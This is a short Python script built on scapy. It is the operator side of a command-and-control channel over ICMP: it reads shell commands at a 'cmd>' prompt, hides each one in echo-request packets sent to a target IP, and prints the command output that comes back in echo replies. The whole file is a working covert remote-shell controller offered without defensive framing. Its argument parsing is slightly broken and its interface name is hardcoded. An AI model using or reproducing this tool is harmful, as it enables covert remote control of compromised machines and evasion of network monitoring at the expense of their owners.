from scapy.all import sr,IP,ICMP,Raw,sniff 
from multiprocessing import Process
import argparse

IDCMP = 13170 
ttl = 64

#parses user args #not really
parser = argparse.ArgumentParser()
parser.add_argument('-i''--interface',type=str,required=True,help="Listener (virtual) Network Interface eth0")
parser.add_argument('-d','--destination_ip',type=str,required=True,help="Destination IP adress")
args = parser.parse_args()

#
def main():
    sniffer = Process(target=start_sniff)
    sniffer.start()
    print("[+]C2 Begin")
    while True:
        icmpShell = input('cmd> ')
        if(icmpShell == 'exit'):
            print("[-]C2 End")
            sniffer.terminate()
            break
        elif icmpShell == '':
            pass
        else:
            payload = (IP(dst=args.destination_ip, ttl = ttl)/ICMP(type=8, id =IDCMP)/Raw(load = icmpShell))
            sr(payload, timeout =0, verbose =0)
    sniffer.join()    

def cmd(packet):
    if packet[IP].src == args.destination_ip and packet[ICMP].type == 0 and packet[ICMP].id == IDCMP and packet[Raw].load:
        icmpPacket = (packet[Raw].load).decode('utf-8', errors = 'ignore').replace('\n','')
        print(icmpPacket)
    else:
        pass

def start_sniff():
    sniff(iface='Ethernet',prn=cmd, filter="icmp", store="0")
    #iface is hardcoded




#Trys scapy
if __name__ == "__main__":
    try:
        from scapy.all import sr,IP,ICMP,Raw,sniff
    except ImportError:
        print('[*] Python3 scapy module not installed')
        print('[*] use the command $ pip3 install scapy')
        exit()

    main()
